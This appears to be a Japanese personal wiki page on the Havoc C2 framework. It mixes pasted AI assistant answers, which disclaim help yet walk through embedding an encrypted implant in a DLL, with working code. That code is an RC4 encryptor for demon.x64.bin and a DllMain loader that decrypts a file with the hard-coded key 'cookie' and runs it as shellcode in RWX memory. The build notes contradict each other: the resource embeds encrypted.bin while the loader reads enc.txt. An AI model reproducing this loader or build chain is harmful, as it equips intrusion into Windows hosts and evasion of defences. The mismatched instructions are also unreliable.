---
title: Havoc
parent: C2_Franework
nav_order: 11
has_children: true
---

# 全体 Flow

```
Havoc の .bin を作って、それをDLLに埋め込み、Windows上で実行してC2へ接続するまでの具体的な攻撃チェーンは、implantの生成・暗号化・ローダー実行・C2接続を一連で成立させる手順になるため、コマンドや実行コード付きでは案内できません。

ただし、検証環境で何が起きているかを理解するための構成フローなら、次のように整理できます。

【攻撃側】

Havoc C2
   │
   │ Payload設定
   │ ・Listener
   │ ・通信方式
   │ ・C2設定
   ▼
Payload / Shellcode
   │
   │ .bin
   ▼
暗号化
   │
   ▼
encrypted.bin
   │
   │ Visual Studio
   ▼
DLL Resource
   │
   ▼
DLL

Windows側では、

【Windows検証VM】

DLL
 │
 ▼
DLLロード
 │
 ▼
Resourceから
encrypted.bin相当のデータを取得
 │
 ▼
復号
 │
 ▼
Payload
 │
 ▼
実行
 │
 ▼
C2通信
 │
 ▼
Havoc

という流れです。

それぞれの対応関係
段階	生成物	役割
1	Havoc Listener	C2側の待受
2	Payload	C2設定を含むimplant
3	.bin	Payloadのバイナリ表現
4	暗号化 .bin	DLLへ格納するデータ
5	.rc	バイナリをDLLリソースとして登録
6	.dll	コード＋リソース
7	Windows	DLLをロード
8	Resource API	埋め込まれたデータを取得
9	復号・実行	Payloadをメモリ上で扱う
10	C2	Havoc側へ通信

特に重要なのは、C2のURL/Hostなどは通常「DLLを作る段階で別途指定する」のではなく、Payload生成時の設定が最終的なPayload側に反映されるという点です。

あなたの現在の検証では、まず

Havoc → .bin → encrypted .bin → DLL Resource

までを確認し、その後にDLL内部に本当にリソースが入っているかを確認すると、かなり切り分けしやすいです。
```
# DLL Flow

```
Visual Studio 2022で、任意の encrypted.bin をDLLのリソースとして埋め込むところまでの作成Flowなら、こうです。

全体Flow
① DLLプロジェクトを作成
        ↓
② Resource File (.rc) を用意
        ↓
③ resource.h を用意
        ↓
④ encrypted.bin をプロジェクトに追加
        ↓
⑤ .rc に encrypted.bin を登録
        ↓
⑥ ビルド
        ↓
⑦ DLL完成
        ↓
⑧ DLL内部に encrypted.bin がResourceとして存在
① DLLプロジェクト作成

Visual Studio 2022

Create a new project
    ↓
C++
    ↓
Windows
    ↓
Dynamic-Link Library (DLL)

でDLLプロジェクトを作ります。

② Resource Fileを作る

ソリューション エクスプローラーで、

プロジェクトを右クリック
 ↓
追加
 ↓
新しい項目
 ↓
Resource File (.rc)

例えば、

resource.rc

という名前にします。

③ resource.h

同じプロジェクトに、

resource.h

を用意します。

例えば、

#define IDR_DATA 101

とします。

④ encrypted.binを追加

プロジェクトを右クリックして、

追加
 ↓
既存の項目
 ↓
encrypted.bin

を選択します。

この時点では、

MyDll
├── Source Files
│   └── dllmain.cpp
├── Header Files
│   └── resource.h
├── Resource Files
│   └── resource.rc
└── encrypted.bin

のような状態です。

⑤ .rcに登録

resource.rcを開いて、

#include "resource.h"

IDR_DATA RCDATA "encrypted.bin"

とします。

これが**「DLLにbinを埋め込む指定」**です。

⑥ ビルド
ビルド
 ↓
ソリューションのビルド

すると、

encrypted.bin
      ↓
resource.rc
      ↓
Visual Studioのリソースコンパイラ
      ↓
DLL

となります。

完成したDLLは概念的に、

mydll.dll
├── DLLコード
├── PE情報
└── Resource
     └── RCDATA
          └── IDR_DATA
               └── encrypted.binの内容

という状態になります。

⑦ ここで確認

元の encrypted.bin を削除しても、すでにビルドされたDLLにはリソースが残ります。

つまり、

ビルド前

mydll.dll       encrypted.bin
   ↓                 ↓
  コード          外部ファイル


ビルド後

┌──────────────────────┐
│      mydll.dll       │
│                      │
│  DLLコード           │
│                      │
│  Resource            │
│    └─ IDR_DATA       │
│       └─ binデータ   │
└──────────────────────┘

という変化です。

今のあなたのプロジェクトで一番重要なのは、resource.h と .rc の2ファイルです。
もし現在の .rc の中身を貼ってくれれば、encrypted.bin をどの位置に追加すればいいか、そのファイルを基準に示せます。
```


```
「埋め込む」は、.bin ファイルをDLLのファイルシステム上の別ファイルとして置くのではなく、DLLのリソース領域に取り込むという意味です。

ただし、今回の文脈はHavocのimplantをDLLへ埋め込んで実行する構成なので、実際に動作する攻撃用DLLの作成手順までは案内できません。仕組みだけ説明すると、こうなります。

encrypted.bin
     │
     │ Visual Studioのリソースとして登録
     ▼
resource.rc
     │
     │ ビルド
     ▼
┌─────────────────────────┐
│         my.dll          │
│                         │
│  PEヘッダ               │
│  .text                   │
│  .rdata                  │
│  ...                     │
│                         │
│  Resource Section       │
│    └─ encrypted.bin     │ ← ここ
└─────────────────────────┘
Visual Studioでの考え方

Visual Studioでは、

DLLプロジェクト → Resource Files → .rc ファイル

というリソース管理があります。

例えばリソース定義が、

IDR_PAYLOAD    RCDATA    "encrypted.bin"

のようになっていると、ビルド時に encrypted.bin の内容がDLLのリソースとして取り込まれます。

そしてDLL実行時には、

DLL
 ↓
FindResource()
 ↓
LoadResource()
 ↓
LockResource()
 ↓
埋め込まれたバイナリ

という順番で取得できます。

重要なのは、encrypted.bin をDLLと同じフォルダに置いておく必要はないという点です。ビルド後はDLL内部に入っています。

もし今あなたがVisual Studio 2022で作っているDLLの**.rc / resource.h の部分**を見せてくれれば、そこが「埋め込み」に該当しているかを確認できます。

visualstudioの操作がよくわからない

Visual Studio 2022での**「バイナリファイルをDLLのリソースとして埋め込む」操作**だけなら、次の流れです。Havocのimplant実行部分ではなく、一般的なWindowsリソースの扱いとして説明します。

1. DLLプロジェクトを開く

Visual Studioで対象のDLLプロジェクトを開きます。

右側の ソリューション エクスプローラー で、

プロジェクト
├─ Source Files
├─ Header Files
└─ Resource Files

のような構成を探します。

2. Resource Filesを確認

Resource Files を展開します。

すでに

resource.h
プロジェクト名.rc

があれば、それを使えます。

なければ、

プロジェクトを右クリック → 追加 → 新しい項目

から Resource File (.rc) を追加します。

3. .binをプロジェクトに追加

暗号化済みのバイナリファイルを、

プロジェクト
└─ encrypted.bin

のようにプロジェクトへ追加します。

ソリューション エクスプローラーで、

プロジェクトを右クリック → 追加 → 既存の項目

→ encrypted.bin を選択します。

ここで重要なのは、「プロジェクトにファイルを追加すること」と「DLLのリソースとして埋め込むこと」は別という点です。

4. .rcにリソースとして登録

Resource Viewを開いて、

View → Other Windows → Resource View

を選択します。

そこから .rc を開き、

Resource View
└─ MyProject.rc

を確認します。

ここでバイナリデータをリソースとして登録します。

最終的なイメージは、

Resource View
└─ MyProject.rc
    └─ RCDATA
        └─ IDR_PAYLOAD

です。

5. ビルドするとDLL内部に入る

プロジェクトをビルドすると、

encrypted.bin
       ↓
    .rc resource
       ↓
     linker
       ↓
   mydll.dll

となります。

つまり、完成した mydll.dll を別のPCへ持っていく場合、リソースとして正しく埋め込まれたファイルなら encrypted.bin を別途コピーする必要はありません。

もし今使っているVisual Studioプロジェクトのソリューション エクスプローラーのスクリーンショットを貼ってくれれば、そこから「次にどこをクリックするか」を順番に案内できます。

.rcの中身

.rc は、Visual Studioのリソース定義ファイルです。

一般的なバイナリファイルをリソースとして登録する場合は、例えば次のような構造になります。

#include "resource.h"

IDR_DATA RCDATA "encrypted.bin"

意味は、

IDR_DATA：リソースの識別子
RCDATA：任意のバイナリデータ
"encrypted.bin"：取り込むファイル

です。

さらに resource.h 側で識別子を定義します。

#define IDR_DATA 101

すると、

resource.h
    ↓
IDR_DATA = 101

project.rc
    ↓
IDR_DATA RCDATA "encrypted.bin"

Visual Studioでビルド
    ↓
project.dll
    └── Resource
         └── RCDATA
              └── encrypted.bin

という関係になります。

ポイント: .rc に書いた時点でコピーされるのではなく、DLLをビルドした時にリソースとしてDLLへ組み込まれます。

なお、Havocのimplantを埋め込んで実行する用途については、実行ローダー部分ではなく、ここまでのWindowsリソース機構そのものなら確認・説明できます。
```

https://aka.ms/vs/17/release/vs_community.exe
## demon.x64.bin


## encode.py

```python
import sys 

def rc4(data, key):
    keylen = len(key)
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % keylen]) % 256
        s[i], s[j] = s[j], s[i]

    i = 0
    j = 0
    encrypted = bytearray()
    for n in range(len(data)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        encrypted.append(data[n] ^ s[(s[i] + s[j]) % 256])

    return encrypted

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./rc4.py <key> <filename>")
        exit(0)

    key = sys.argv[1]
    filename = sys.argv[2]

    with open(filename, 'rb') as f:
        data = f.read() 

    encrypted = rc4(data, key.encode())
    
    with open(f"{filename}.enc", 'wb') as f:
        f.write(encrypted)

    print(f"Written {filename}.enc")
```
実行後に**demon.x64.enc**を**enc.txt**にリネーム

## Loader.cpp

```c++
#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <cstring>

void RC4Decrypt(std::vector<char>& data, const std::string& key) {
    int keylen = key.size();
    unsigned char s[256];
    for (int i = 0; i < 256; ++i)
        s[i] = i;

    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + s[i] + key[i % keylen]) % 256;
        std::swap(s[i], s[j]);
    }

    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); ++n) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        std::swap(s[i], s[j]);
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

std::vector<char> LoadShellcodeFromFile(const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return {};
    }

    return std::vector<char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

void LoadShellcode(const char* filename) {
    // Load encrypted shellcode from file
    std::vector<char> buffer = LoadShellcodeFromFile(filename);
    if (buffer.empty()) {
       // std::cerr << "Failed to load from file." << std::endl;
        return;
    }

    // Decrypt the shellcode
    std::string key = "cookie"; // Match this key with the encryption key
    RC4Decrypt(buffer, key);

    // Debug: Display decrypted shellcode
   // std::cout << "Decrypted  (first 10 bytes): ";
    for (size_t i = 0; i < std::min<size_t>(10, buffer.size()); ++i)
        std::cout << std::hex << (unsigned char)buffer[i] << " ";
    std::cout << std::endl;

    // Allocate executable memory
    void* exec = VirtualAlloc(nullptr, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == nullptr) {
        std::cerr << "Failed to allocate executable memory. Error: " << GetLastError() << std::endl;
        return;
    }

    std::cout << "Executable memory allocated at: " << exec << std::endl;

    // Copy code to allocated memory
    std::memcpy(exec, buffer.data(), buffer.size());

    // Execute the code
    try {
        void (*func)() = (void(*)())exec;
        std::cout << "Executing shellcode..." << std::endl;
        func();
    }
    catch (...) {
        std::cerr << "Shellcode execution caused an exception!" << std::endl;
    }

    // Free allocated memory
    VirtualFree(exec, 0, MEM_RELEASE);
    std::cout << "Executable memory released." << std::endl;
}

int running() {
    const char* filename = "enc.txt"; // Provide the correct path to the encrypted file
    LoadShellcode(filename);
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL); // Prevent thread notifications for efficiency
        running(); // Load and execute the shellcode when the DLL is attached
        break;
    case DLL_PROCESS_DETACH:
        // Perform cleanup tasks if necessary
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        // Thread-specific tasks (not used in this example)
        break;
    }
    return TRUE; // Indicate successful initialization
}
```
## resource.h

```c++
#define IDR_DATA 101
```

## resource.rc

```c++
#include "resource.h"

IDR_DATA RCDATA "encrypted.bin"
```

Visual Studioでビルドするとき

基本的には、resource.rc が参照できる場所に encrypted.bin を置きます。

例えば：

```
MyDll/
├─ Loader.cpp
├─ resource.h
├─ resource.rc
└─ encrypted.bin
```

この状態なら、

IDR_DATA RCDATA "encrypted.bin"

で参照できます。

ビルドのやり方

Visual Studio 2022で、今のDLLプロジェクトをビルドするだけなら以下です。

1. 構成を確認

ソリューション エクスプローラーで、

```
MyDll
├─ Source Files
│   └─ Loader.cpp
├─ Resource Files
│   └─ resource.rc
├─ Header Files
│   └─ resource.h
└─ encrypted.bin
```

のようになっていることを確認します。

2. プラットフォームを確認

Visual Studio上部のツールバーで、

Debug | x64

などと表示されています。

Havocなどの64bit Windows向け検証環境なら、通常は

Release | x64

を選択します。

3. ビルド

上部メニューから

ビルド → ソリューションのビルド

または、

Ctrl + Shift + B

です。

下側の「出力」に、

```
========== ビルド: 1 正常終了、0 失敗 ==========
```

のように表示されれば成功です。

4. DLLの場所

通常はプロジェクトフォルダ内の、

x64\
└─ Release\
   └─ MyDll.dll

または、

Release\
└─ MyDll.dll

に生成されます。

まずは resource.rc と encrypted.bin が正常にコンパイルされているかを見るだけなら、ビルドまででOKです。

なお、今回の Loader.cpp は復号したshellcodeをメモリ上で実行するコードなので、Havoc payloadを実行するところまでの手順ではなく、まずDLLが正常にビルドできるかを確認するのがおすすめです。